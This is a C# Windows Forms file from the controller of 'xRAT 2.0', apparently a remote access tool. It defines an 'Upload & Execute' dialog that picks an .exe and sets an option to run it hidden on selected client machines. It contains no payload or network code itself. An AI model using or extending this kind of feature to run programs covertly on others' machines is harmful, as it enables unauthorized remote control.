using System;
using System.IO;
using System.Windows.Forms;

namespace xServer.Forms
{
    public partial class frmUploadAndExecute : Form
    {
        private int selectedClients;

        public frmUploadAndExecute(int selected)
        {
            selectedClients = selected;
            InitializeComponent();
        }

        private void frmUploadAndExecute_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Upload & Execute [Selected: {0}]", selectedClients);
            chkRunHidden.Checked = UploadAndExecute.RunHidden;
        }

        private void btnUploadAndExecute_Click(object sender, EventArgs e)
        {
            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Multiselect = false;
                ofd.Filter = "Executable (*.exe)|*.exe";
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    var filePath = Path.Combine(ofd.InitialDirectory, ofd.FileName);
                    txtPath.Text = filePath;

                    UploadAndExecute.File = (File.Exists(filePath) ? File.ReadAllBytes(filePath) : new byte[0]);
                    UploadAndExecute.FileName = ofd.SafeFileName;
                    UploadAndExecute.RunHidden = chkRunHidden.Checked;
                }
            }
        }
    }

    public class UploadAndExecute
    {
        public static byte[] File { get; set; }
        public static string FileName { get; set; }
        public static bool RunHidden { get; set; }
    }
}
